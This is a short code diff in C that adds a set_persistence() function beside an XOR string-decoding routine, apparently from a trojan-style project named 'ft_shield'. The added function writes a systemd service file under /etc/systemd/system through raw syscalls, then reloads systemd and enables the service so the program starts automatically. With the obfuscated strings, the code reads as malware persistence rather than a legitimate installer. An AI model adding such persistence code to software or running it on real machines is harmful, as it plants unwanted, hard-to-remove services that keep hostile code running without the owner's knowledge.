@@ -14,3 +14,19 @@ void decode(int *data, char *decoded, int key, int n) {
         decoded[i] = data[i] ^ key;
     }
 }
+
+void set_persistence() {
+    const char *path = "/etc/systemd/system/ft_shield.service";
+    int fd = sc(SYS_open ,path, O_CREAT | O_RDWR, 0644);
+    if (fd < 0) {
+        perror("open : ");
+        return ;
+    } else {
+        write(1, "service file created\n", 22);
+    }
+    sc(SYS_write, fd, SYSTEMCTL_CONFIG, strlen(SYSTEMCTL_CONFIG));
+
+    system("systemctl daemon-reexec");
+    system("systemctl enable /etc/systemd/system/ft_shield.service");
+    close(fd);
+}
